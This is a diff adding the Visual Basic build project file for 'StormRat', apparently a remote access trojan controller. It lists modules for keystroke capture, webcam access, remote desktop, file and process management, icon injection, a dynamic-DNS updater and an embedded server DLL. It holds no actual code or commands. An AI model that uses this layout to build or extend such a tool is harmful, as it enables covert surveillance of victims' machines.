@@ -1,0 +1,351 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>
+    </ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{49663D5D-8AB1-47A7-8BB6-0E2AD8647B3C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>StormRat.My.MyApplication</StartupObject>
+    <RootNamespace>StormRat</RootNamespace>
+    <AssemblyName>StormRat</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>StormRat.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>StormRat.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>Storm.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|AnyCPU'">
+    <DebugSymbols>true</DebugSymbols>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>StormRat.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <DebugType>full</DebugType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <CodeAnalysisLogFile>bin\Debug\StormRat.exe.CodeAnalysisLog.xml</CodeAnalysisLogFile>
+    <CodeAnalysisUseTypeNameInSuppression>true</CodeAnalysisUseTypeNameInSuppression>
+    <CodeAnalysisModuleSuppressionsFile>GlobalSuppressions.vb</CodeAnalysisModuleSuppressionsFile>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <CodeAnalysisRuleSetDirectories>;C:\Program Files (x86)\Microsoft Visual Studio 10.0\Team Tools\Static Analysis Tools\\Rule Sets</CodeAnalysisRuleSetDirectories>
+    <CodeAnalysisRuleDirectories>;C:\Program Files (x86)\Microsoft Visual Studio 10.0\Team Tools\Static Analysis Tools\FxCop\\Rules</CodeAnalysisRuleDirectories>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|AnyCPU'">
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>StormRat.xml</DocumentationFile>
+    <Optimize>true</Optimize>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <CodeAnalysisLogFile>bin\Release\StormRat.exe.CodeAnalysisLog.xml</CodeAnalysisLogFile>
+    <CodeAnalysisUseTypeNameInSuppression>true</CodeAnalysisUseTypeNameInSuppression>
+    <CodeAnalysisModuleSuppressionsFile>GlobalSuppressions.vb</CodeAnalysisModuleSuppressionsFile>
+    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
+    <CodeAnalysisRuleSetDirectories>;C:\Program Files (x86)\Microsoft Visual Studio 10.0\Team Tools\Static Analysis Tools\\Rule Sets</CodeAnalysisRuleSetDirectories>
+    <CodeAnalysisRuleDirectories>;C:\Program Files (x86)\Microsoft Visual Studio 10.0\Team Tools\Static Analysis Tools\FxCop\\Rules</CodeAnalysisRuleDirectories>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Interop.NATUPNPLib">
+      <HintPath>Resources\Interop.NATUPNPLib.dll</HintPath>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="upnp">
+      <HintPath>Resources\upnp.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AeroListView.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="AeroTreeView.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="ChatSystem.Designer.vb">
+      <DependentUpon>ChatSystem.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ChatSystem.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Clipboard.Designer.vb">
+      <DependentUpon>Clipboard.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Clipboard.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Connection.vb" />
+    <Compile Include="Data.vb" />
+    <Compile Include="DialogBox.Designer.vb">
+      <DependentUpon>DialogBox.vb</DependentUpon>
+    </Compile>
+    <Compile Include="DialogBox.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Download.Designer.vb">
+      <DependentUpon>Download.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Download.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Encryption.vb" />
+    <Compile Include="FileDownload.vb" />
+    <Compile Include="FileManager.Designer.vb">
+      <DependentUpon>FileManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FileManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FileUpload.vb" />
+    <Compile Include="Find.Designer.vb">
+      <DependentUpon>Find.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Find.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="GroupBoxControl.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="IconInjector.vb" />
+    <Compile Include="InfoContainer.vb" />
+    <Compile Include="Information.Designer.vb">
+      <DependentUpon>Information.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Information.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="KeystrokeCapture.Designer.vb">
+      <DependentUpon>KeystrokeCapture.vb</DependentUpon>
+    </Compile>
+    <Compile Include="KeystrokeCapture.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="No-IP Updater.Designer.vb">
+      <DependentUpon>No-IP Updater.vb</DependentUpon>
+    </Compile>
+    <Compile Include="No-IP Updater.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessManager.Designer.vb">
+      <DependentUpon>ProcessManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RemoteDesktop.Designer.vb">
+      <DependentUpon>RemoteDesktop.vb</DependentUpon>
+    </Compile>
+    <Compile Include="RemoteDesktop.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Script.Designer.vb">
+      <DependentUpon>Script.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Script.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SelectServer.Designer.vb">
+      <DependentUpon>SelectServer.vb</DependentUpon>
+    </Compile>
+    <Compile Include="SelectServer.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SendMessage.Designer.vb">
+      <DependentUpon>SendMessage.vb</DependentUpon>
+    </Compile>
+    <Compile Include="SendMessage.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="StormTheme.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Storm_Rat.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Storm_Rat.Designer.vb">
+      <DependentUpon>Storm_Rat.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Theme.Designer.vb">
+      <DependentUpon>Theme.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Theme.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ThemeBase.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Webcam.Designer.vb">
+      <DependentUpon>Webcam.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Webcam.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="WebcamDevice.Designer.vb">
+      <DependentUpon>WebcamDevice.vb</DependentUpon>
+    </Compile>
+    <Compile Include="WebcamDevice.vb">
+      <SubType>Form</SubType>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="ChatSystem.resx">
+      <DependentUpon>ChatSystem.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Clipboard.resx">
+      <DependentUpon>Clipboard.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="DialogBox.resx">
+      <DependentUpon>DialogBox.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Download.resx">
+      <DependentUpon>Download.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FileManager.resx">
+      <DependentUpon>FileManager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Find.resx">
+      <DependentUpon>Find.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Information.resx">
+      <DependentUpon>Information.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="KeystrokeCapture.resx">
+      <DependentUpon>KeystrokeCapture.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="No-IP Updater.resx">
+      <DependentUpon>No-IP Updater.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessManager.resx">
+      <DependentUpon>ProcessManager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="RemoteDesktop.resx">
+      <DependentUpon>RemoteDesktop.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Script.resx">
+      <DependentUpon>Script.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="SelectServer.resx">
+      <DependentUpon>SelectServer.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="SendMessage.resx">
+      <DependentUpon>SendMessage.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Storm_Rat.resx">
+      <DependentUpon>Storm_Rat.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Theme.resx">
+      <DependentUpon>Theme.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Webcam.resx">
+      <DependentUpon>Webcam.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="WebcamDevice.resx">
+      <DependentUpon>WebcamDevice.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Archiver.dll" />
+    <None Include="Resources\StormServer.dll" />
+    <Content Include="Storm.ico" />
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
